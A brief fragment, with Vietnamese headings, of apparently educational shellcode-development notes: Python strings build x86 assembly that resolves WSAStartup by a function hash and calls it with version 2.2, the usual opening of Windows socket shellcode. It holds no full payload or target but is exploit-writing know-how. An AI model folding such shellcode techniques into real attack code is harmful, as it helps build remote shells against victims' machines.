## Assembly:
### Tìm hàm
```
code += "push 0x3bfcedcb; " # WSAStartup
code += "call dword ptr [ebp + 0x4];"
code += "mov [ebp + 0x10], eax;"
```
### Gọi hàm
```
code += "mov eax, esp;"     
code += "mov cx, 0x590;"    
code += "sub eax, ecx;" 
code += "push eax;"         # setup cho &wsaData
code += "xor eax,eax;"
code += "mov ax, 0x0202;"   # wVersionRequested 2.2
code += "push eax;"
code += "call dword ptr [ebp + 0x10];"

```
